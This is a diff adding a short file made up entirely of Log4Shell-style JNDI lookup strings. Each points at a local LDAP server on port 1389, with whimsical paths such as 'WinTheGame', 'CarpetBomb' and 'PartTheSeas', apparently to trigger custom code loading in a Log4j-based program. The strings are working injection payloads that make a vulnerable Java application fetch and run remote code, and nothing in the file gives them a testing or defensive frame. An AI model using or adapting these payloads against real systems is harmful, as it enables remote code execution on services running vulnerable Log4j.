@@ -1,0 +1,10 @@
+${jndi:ldap://127.0.0.1:1389/ServerTest}
+
+${jndi:ldap://127.0.0.1:1389/WinTheGame}
+${jndi:ldap://127.0.0.1:1389/UnlockTruePotential}
+${jndi:ldap://127.0.0.1:1389/MoreDakka}
+${jndi:ldap://127.0.0.1:1389/InstantPerimeter}
+${jndi:ldap://127.0.0.1:1389/CarpetBomb}
+${jndi:ldap://127.0.0.1:1389/ItemCleanup}
+${jndi:ldap://127.0.0.1:1389/AddRemovedItems}
+${jndi:ldap://127.0.0.1:1389/PartTheSeas}
